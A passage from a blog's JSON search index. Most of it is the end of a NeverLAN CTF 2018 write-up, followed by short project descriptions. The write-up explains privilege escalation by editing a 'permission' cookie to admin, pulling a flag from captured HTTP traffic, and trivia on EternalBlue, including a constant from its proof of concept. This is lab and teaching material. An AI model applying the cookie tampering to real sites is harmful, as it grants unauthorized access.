comment in the HTML. We login using those credentials. Then, we find that the cureent permission is DEFAULT. We need admin permissions to view the flag. On inspecting the cookies, we find that there is a cookie permission which has its value as user. We use the EditThisCookie plugin to change its value to admin. On refreshing, we get the flag as a blog post flag{C00ki3s_c4n_b33_ch4ng3d_?}\n Passwords Challenges  1. Encoding != Hashing\nWe are given a pcap capture. We open this in Wireshark and analyse the HTTP packets using the http filter. On reading the contents of the filtered packets, we find the flag.\n\r\r\rWireshark Packets analysis\r\r\rThe flag is flag{help-me-obiwan}\n Trivia Challenges  1. Can you Name it?\nProblem— This system provides a reference-method for publicly known information-security vulnerabilities and exposures.\nAnswer— Common Vulnerabilities and Exposures\n 2. Can you find it? (Bonus)\nProblem— This Vulnerability was used for a major worldwide Ransomware attack. It was so bad it forced the software company to write a patch for end of life systems that they had stopped supporting years before the attack.\nAnswer— EternalBlue. And the ransomware was WannaCry.\n 3. Yummy…\nProblem— These store small pieces of data sent from a website to the user’s computer. This yummy sounding things are stored by the user’s web browser while the user surfing the web. Answer is non-singular.\nAnswer— Cookies\n 4. Can you find it?\nProblem— This Vulnerability was used for a major worldwide Ransomware attack. It was so bad it forced the software company to write a patch for end of life systems that they had stopped supporting years before the attack.\nAnswer— The formal listing code (CVE) for EternalBlue is CVE-2017–0144\n 5. Can you search it?\nProblem— For the Vulnerability you found in question 2, There is a proof of concept. What is the string for TARGET_HAL_HEAP_ADDR_x64?\nAnswer— The vulnerability being discussed is EternalBlue. We canf ind the source code at this link. There we find that TARGET_HAL_HEAP_ADDR_x64 is assigned 0xffffffffffd00010\n 6. Who knew?\nProblem— This product had Highest Number Of “Distinct” Vulnerabilities in 1999\nAnswer— A simple Google search of “Highest Number Of “Distinct” Vulnerabilities in 1999\u0026quot;, gets us the following link. The product with the highest vulnerabilities was Windows NT\n Blast from the Past Challenges 1. cookie_monster\nOn inspecting the cookies, we find that the Cookie value should be the Red Guy’s name. We change the value of the cookie to Elom. On refreshing the page, we get the flag as flag{C00kies_4r3_the_b3st}\n","date":1519721758,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1575041659,"objectID":"3bb2f739ac0a171e988d00372c0b0d0d","permalink":"https://shreyansh26.github.io/post/2018-02-27_neverlan-ctf-2018-writeups/","publishdate":"2018-02-27T08:55:58.711Z","relpermalink":"/post/2018-02-27_neverlan-ctf-2018-writeups/","section":"post","summary":"These are the writeups of the problems I solved over the weekend for the NeverLAN CTF 2018.","tags":["ctf","information security","infosec","writeups"],"title":"NeverLAN CTF 2018 Writeups","type":"post"},{"authors":["Shreyansh Singh"],"categories":["Natural Language Processing"],"content":"Work done as a part of the organizing team of RevOpiD, a shared task organized at IJCNLP 2017 (International Joint Conference on Natural Language Processing, Taipei, Taiwan). The task aims to produce a top-k ranking of product reviews which can sufficiently represent the gist of opinions expressed in all the reviews of that product. Implemented the official baseline for Subtask-B of the shared task. Also volunteered to annotate gold dataset for the shared task.\n","date":1511178345,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1511178345,"objectID":"a82704abc404cb5c05956f7caaafd136","permalink":"https://shreyansh26.github.io/project/revopid/","publishdate":"2017-11-20T17:15:45+05:30","relpermalink":"/project/revopid/","section":"project","summary":"Baseline model for RevOpiD, a shared task organized at IJCNLP 2017 (International Joint Conference on Natural Language Processing, Taipei, Taiwan).","tags":["nlp","information retrieval","ir","sentiment analysis"],"title":"Review Opinion Diversificatio\u0026shy;n","type":"project"},{"authors":["Shreyansh Singh"],"categories":["Application Development"],"content":"Created a social networking website (webapp) using the Django framework as a part of my curriculum project.\nImplemented features like user authentication, profile creation and edit options, posts/blogs creation, like and comment on the posts, searching other users, personal messaging between users, following other users and a meme generator for generating memes.\n","date":1508503460,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1508503460,"objectID":"2c44d8f0a9b686d065012cee7feec1a4","permalink":"https://shreyansh26.github.io/project/worldlink/","publishdate":"2017-10-20T18:14:20+05:30","relpermalink":"/project/worldlink/","section":"project","summary":"A social networking website made using Django","tags":["web development","django","python"],"title":"Worldlink - Social Networking Website","type":"project"},{"authors":null,"categories":null,"content":" ","date":-62135596800,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":-62135596800,"objectID":"e60558bac1291bdc4d083e39d50c375e","permalink":"https://shreyansh26.github.io/tags/","publishdate":"0001-01-01T00:00:00Z","relpermalink":"/tags/","section":"","summary":"Popular tags","tags":null,"title":"Tags","type":"widget_page"}]